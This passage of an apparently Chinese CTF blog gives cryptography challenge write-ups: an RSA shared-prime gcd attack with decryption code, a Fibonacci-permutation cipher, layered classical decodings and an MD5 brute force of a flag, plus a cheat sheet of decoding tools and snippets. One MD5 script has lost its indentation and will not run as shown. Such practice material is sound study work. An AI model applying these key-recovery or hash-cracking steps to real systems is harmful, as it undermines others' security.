class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c15 = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c16 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c17 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c18 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c19 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line">n=[n0,n1,n2,n3,n4,n5,n6,n7,n8,n9,n10,n11,n12,n13,n14,n15,n16,n17,n18,n19]</span><br><span class="line">c=[c0,c1,c2,c3,c4,c5,c6,c7,c8,c9,c10,c11,c12,c13,c14,c15,c16,c17,c18,c19]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span>(i!=j):</span><br><span class="line">            <span class="keyword">if</span>(gcd(n[i],n[j])!=<span class="number">1</span>):   <span class="comment">#对不同的n进行欧几里得算法，以求出最大公约数</span></span><br><span class="line">                <span class="built_in">print</span>(i,j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>,gcd(n[i],n[j]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>求出p后，就可以解出q、d、m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">n4 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c4 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">p = mpz(<span class="number">132585806383798600305426957307612567604223562626764190211333136246643723811046149337852966828729052476725552361132437370521548707664977123165279305052971868012755509160408641100548744046621516877981864180076497524093201404558036301820216274968638825245150755772559259575544101918590311068466601618472464832499</span>)</span><br><span class="line"></span><br><span class="line">q = n4//p        <span class="comment">#“//”  整除</span></span><br><span class="line"></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e,phi)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c4,d,n4)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)    <span class="comment"># &quot;n2s&quot; (数值转字符串)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h2 id="达芬奇密码"><a href="#达芬奇密码" class="headerlink" title="达芬奇密码"></a>达芬奇密码</h2><p>斐波那契数列。题目中给到的两个数列的长度都是32，并且flag也是32位，可以推测，神秘数列是通过flag位移后得出的，而位移的规则是斐波那契数列的位移。第零位1还是1，没有位移。第一位233是斐波那契数列的第十二位（以0开始算），因此下面神秘数字串的第一位的6是原本flag的第十二位。第二位3是斐波那契数列的第三位，因此下面神秘数字串的第二位的9是原本flag的第三位。运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#主要思路是遍历fakefibbo，然后找出对应哪一位，如fb中第二个数对应rb中第五个</span></span><br><span class="line"><span class="comment">#然后cipher对应fakebibbo,因此cipher中第二个数对应flag第五个数</span></span><br><span class="line"><span class="comment">#因此有reslut[4]=cipher[1],依次类推</span></span><br><span class="line">realfibbo = <span class="string">&#x27;1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 2584 4181 6765 10946 17711 28657 46368 75025 121393 196418 317811 514229 832040 1346269 2178309&#x27;</span></span><br><span class="line">fakefibbo = <span class="string">&#x27;1 233 3 2584 1346269 144 5 196418 21 1597 610 377 10946 89 514229 987 8 55 6765 2178309 121393 317811 46368 4181 1 832040 2 28657 75025 34 13 17711&#x27;</span></span><br><span class="line">cipher = <span class="string">&#x27;36968853882116725547342176952286&#x27;</span></span><br><span class="line">realfibbo = realfibbo.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">fakefibbo = fakefibbo.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">result = [<span class="string">&#x27;a&#x27;</span>]*<span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="comment">#这里要考虑到第二个1(fb[24])寻找的时候，会找到1123中第一个数，也就是index=0，而我们希望他找到第二个数，也就是index=1</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">24</span>):</span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        index = realfibbo.index(fakefibbo[i])</span><br><span class="line">    result[index] = cipher[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="佛说：只能四天"><a href="#佛说：只能四天" class="headerlink" title="佛说：只能四天"></a>佛说：只能四天</h2><p>佛曰论禅解密，再核心价值观解密，得到的字符串末尾doyouknowfence栅栏解密，得到的字符串末尾doyouknowCaesar凯撒解密，提升说凯撒不是最后一步，字符串全为大写字母，猜测base32解密，挨个去试得到flag</p><img src="https://blue-blue-blue-blue.github.io/img/b33.png" width ="60%"><h2 id="rot"><a href="#rot" class="headerlink" title="rot"></a>rot</h2><p>去掉空格，解rot。得到flag{www_shiyanbar_com_is_very_good_???} MD5:38e4c352809e150186920aac37190cbc，要md5爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="string">&#x27;83 89 78 84 45 86 96 45 115 121 110 116 136 132 132 132 108 128 117 118 134 110 123 111 110 127 108 112 124 122 108 118 128 108 131 114 127 134 108 116 124 124 113 108 76 76 76 76 138 23 90 81 66 71 64 69 114 65 112 64 66 63 69 61 70 114 62 66 61 62 69 67 70 63 61 110 110 112 64 68 62 70 61 112 111 112&#x27;</span></span><br><span class="line">l=c.split(<span class="string">&#x27; &#x27;</span>)    <span class="comment">#去掉空格放入list中方便转字符，要注意split之后产生的list中每个元素都是str</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):    <span class="comment">#逐个先转int，再转字符后又组成字符串</span></span><br><span class="line">    s+=<span class="built_in">chr</span>(<span class="built_in">int</span>(l[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">14</span>):    <span class="comment">#这里是因为我后来已经知道是rot13，所以这里就只循环到13方便看一下结果</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">         <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[j])-i),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m=<span class="string">&quot;38e4c352809e150186920aac37190cbc&quot;</span></span><br><span class="line">flag=<span class="string">&quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">                w=hashlib.md5(<span class="built_in">str</span>(flag + <span class="built_in">chr</span>(x) + <span class="built_in">chr</span>(y) + <span class="built_in">chr</span>(z) + <span class="built_in">chr</span>(q) + <span class="string">&quot;&#125;&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                w0=w.hexdigest()</span><br><span class="line">                <span class="keyword">if</span>(w0==m):</span><br><span class="line">                    <span class="built_in">print</span>(flag+<span class="built_in">chr</span>(x)+<span class="built_in">chr</span>(y)+<span class="built_in">chr</span>(z)+<span class="built_in">chr</span>(q)+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆破得flag{www_shiyanbar_com_is_very_good_@8Mu}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>crypto-key</title>
      <link href="/2022/09/27/crypto-key/"/>
      <url>/2022/09/27/crypto-key/</url>
      
        <content type="html"><![CDATA[<blockquote><h2 id="注意提示-key"><a href="#注意提示-key" class="headerlink" title="注意提示(key)"></a>注意提示(key)</h2><p>终端运行python，输入python  加一个空格  加文件地址（或者直接将文件拖入到终端界面）</p><p>python3里hex(d)的结果和python2里hex(d)的结果可能有别差了</p></blockquote><blockquote><h2 id="解密网址"><a href="#解密网址" class="headerlink" title="解密网址"></a>解密网址</h2><p><a href="http://www.hiencode.com/">总</a></p><p><a href="https://cmd5.com/">MD5、ntlm</a>    <a href="https://www.iamwawa.cn/urldecode.html">MD5 、url、文本处理、摩斯电码</a>  <a href="https://wtool.com.cn/quoted.html">Quoted-printable</a> <a href="https://www.sojson.com/encrypt_rabbit.html">Rabbit</a> <a href="http://code.mcdvisa.com/">中文电码</a>  <a href="https://quipqiup.com/">quipqiup(强行爆破,替换)</a>   <a href="http://www.metools.info/code/c90.html#:~:text=%E7%8C%AA%E5%9C%88%E5%AF%86%E7%A0%81,%EF%BC%88%E4%BA%A6%E7%A7%B0%E6%9C%B1%E9%AB%98%E5%AF%86%E7%A0%81%E3%80%81%E5%85%B1%E6%B5%8E%E4%BC%9A%E6%9A%97%E5%8F%B7%E3%80%81%E5%85%B1%E6%B5%8E%E4%BC%9A%E5%AF%86%E7%A0%81%E6%88%96%E5%85%B1%E6%B5%8E%E4%BC%9A%E5%91%98%E5%AF%86%E7%A0%81%EF%BC%89%EF%BC%8C%E6%98%AF%E4%B8%80%E7%A7%8D%E4%BB%A5%E6%A0%BC%E5%AD%90%E4%B8%BA%E5%9F%BA%E7%A1%80%E7%9A%84%E7%AE%80%E5%8D%95%E6%9B%BF%E4%BB%A3%E5%BC%8F%E5%AF%86%E7%A0%81%EF%BC%8C%E6%9B%BE%E7%BB%8F%E6%98%AF%E7%BE%8E%E5%9B%BD%E5%86%85%E6%88%98%E6%97%B6%E7%9B%9F%E5%86%9B%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%8C%E7%9B%AE%E5%89%8D%E4%BB%85%E5%9C%A8%E5%AF%86%E7%A0%81%E6%95%99%E5%AD%A6%E3%80%81%E5%90%84%E7%A7%8D%E7%AB%9E%E8%B5%9B%E4%B8%AD%E4%BD%BF%E7%94%A8%E3%80%82">猪圈密码</a>  <a href="http://www.hiencode.com/pub_asys.html">公钥解析 </a> </p><p><a href="https://ctf.bugku.com/tools">base、凯撒、栅栏、UUencode、XXencode、希尔、与佛论禅、ADFGX、核心价值观编码、Sojson、维吉尼亚、TripleDes(3DES)、Brainfuck</a> </p><p><a href="http://www.metools.info/code/playfair_186.html">Playfair&#x2F;普莱费尔</a>  <a href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">ROT5&#x2F;13&#x2F;18&#x2F;47</a> <a href="https://www.splitbrain.org/services/ook">Ook! </a> <a href="http://hi.pcmoe.net/buddha.html">新约佛论禅</a></p><p><a href="https://the-x.cn/base64">Base64转文件</a> <a href="https://www.bejson.com/convert/ox2str/">16进制转文本</a>  <a href="http://www.toolhelper.cn/EncodeDecode/Base64HexEncodeDecode">16进制转base64</a> <a href="https://www.qqxiuzi.cn/bianma/ascii.htm">ASCII编码转换</a> <a href="https://coding.tools/cn/">进制、ASCII转换</a> <a href="http://factordb.com/">N分解为p、q</a> </p><p><a href="http://hi.pcmoe.net/kaomoji.html">颜文字加密</a> <a href="http://www.atoolbox.net/Tool.php?Id=937">Emoji表情符号编码</a> <a href="https://lingojam.com/WingdingsTranslator">Wingdings</a> </p><p><a href="https://www.zhangxinxu.com/sp/base64.html">任意文件转base64后</a><a href="http://tool.chacuo.net/cryptserpent">Serpent解密</a></p></blockquote><blockquote><h2 id="脑洞"><a href="#脑洞" class="headerlink" title="脑洞"></a>脑洞</h2><p>key{xxxxxx},x的个数代表字符的个数</p><p>六十年甲子表对应的数值视为与ASCII值相关</p></blockquote><blockquote><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;xxxxxxxxx&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;xxxxxxxxx&#x27;</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span>(a[i] == b[i]):</span><br><span class="line">         c+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         c+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(c)</span><br></pre></td></tr></table></figure></blockquote><blockquote><h2 id="进制、ASCII转换"><a href="#进制、ASCII转换" class="headerlink" title="进制、ASCII转换"></a>进制、ASCII转换</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">l = [111,114,157,166,145,123,145,143,165,162,151,164,171,126,145,162,171,115,165,143,150]</span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line">for i in l:</span><br><span class="line">    i = str(i)</span><br><span class="line">    res += chr(int(i,8))  #int(i,8)是十进制转八进制，chr()是转ASCII码</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></blockquote><blockquote><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><p>组成：由数字和字母(全小写或者全大写)组成。</p><p>MD5爆破：已知字符串k：TASC?O3RJMV?WDJKX?ZM,问号部分是未知大写字母，这个字串的32位MD5码。但是我们获得它残缺不全，E903???4DAB????08?????51?80??8A?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="comment">#print hashlib.md5(s).hexdigest().upper()</span></span><br><span class="line">k = <span class="string">&#x27;TASC?O3RJMV?WDJKX?ZM&#x27;</span>                    <span class="comment">#要还原的明文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">temp1 = k.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">chr</span>(<span class="number">65</span>+i)),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">temp2 = temp1.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">chr</span>(<span class="number">65</span>+j),<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">temp3 = temp2.replace(<span class="string">&#x27;?&#x27;</span>,<span class="built_in">chr</span>(<span class="number">65</span>+n),<span class="number">1</span>)</span><br><span class="line">s = hashlib.md5(temp3.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest().upper()<span class="comment">#注意大小写</span></span><br><span class="line"><span class="keyword">if</span> s[:<span class="number">4</span>] == <span class="string">&#x27;E903&#x27;</span>:    <span class="comment">#检查元素,用残缺MD5第一个？前的字符串</span></span><br><span class="line"><span class="built_in">print</span> (s)       <span class="comment">#输出密文</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>已知flag{www_shiyanbar_com_is_very_good_????},和整体md5值38e4c352809e150186920aac37190cbc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">m=<span class="string">&quot;38e4c352809e150186920aac37190cbc&quot;</span></span><br><span class="line">flag=<span class="string">&quot;flag&#123;www_shiyanbar_com_is_very_good_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,<span class="number">127</span>):</span><br><span class="line">                w=hashlib.md5(<span class="built_in">str</span>(flag + <span class="built_in">chr</span>(x) + <span class="built_in">chr</span>(y) + <span class="built_in">chr</span>(z) + <span class="built_in">chr</span>(q) + <span class="string">&quot;&#125;&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">                w0=w.hexdigest()</span><br><span class="line">                <span class="keyword">if</span>(w0==m):</span><br><span class="line">                    <span class="built_in">print</span>(flag+<span class="built_in">chr</span>(x)+<span class="built_in">chr</span>(y)+<span class="built_in">chr</span>(z)+<span class="built_in">chr</span>(q)+<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>eg:04ad5938eaf0efb&#x2F;327a6c4304ad5938eaf0efb6cc3e53dc(flag)，c3088560732a5ac1&#x2F;f95b70fdc3088560732a5ac135644506(“{“)，8e05c9709e5dcaed&#x2F;cbb184dd8e05c9709e5dcaedaa0495cf(“}”)</p></blockquote><blockquote><h2 id="base"><a href="#base" class="headerlink" title="base"></a>base</h2><blockquote><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>组成：含大小写字母、数字、<strong>末尾可能有1、2个“&#x3D;”</strong></p><p>用于url的base64编码：结尾填充“&#x3D;”，并将标准Base64中的“+”和“&#x2F;”分别改成了“-”和“_”</p><p>用于正则表达式的改进Base64变种，它将“+”和“&#x2F;”改成了“!”和“-”</p><p>Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3<em>8 &#x3D; 4</em>6 &#x3D; 24），然后把6Bit再添两位高位0，组成四个8Bit的字节，也就是说，转换后的字符串理论上将要比原来的长1&#x2F;3。(不计填充末尾的等号约为1&#x2F;3) </p><p>eg:<strong>ZmxhZw</strong>&#x3D;&#x3D;（flag），ew(“{“)，fQ(“}”)</p><p>已知字典和一个字符串，字符串在字典对应的数字在base64字典对应，将对应出的字符进行base64解码,eg:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="built_in">dict</span>=&#123;<span class="number">0</span>: <span class="string">&#x27;J&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;K&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;L&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;M&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;N&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;O&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;x&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;y&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;U&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;V&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;z&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;A&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;B&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;C&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;D&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;E&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;F&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;G&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;H&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;7&#x27;</span>, <span class="number">20</span>: <span class="string">&#x27;8&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;9&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;P&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;Q&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;I&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;a&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;b&#x27;</span>, <span class="number">27</span>: <span class="string">&#x27;c&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;d&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;e&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;f&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;g&#x27;</span>, <span class="number">32</span>: <span class="string">&#x27;h&#x27;</span>,<span class="number">33</span>: <span class="string">&#x27;i&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;j&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;k&#x27;</span>, <span class="number">36</span>: <span 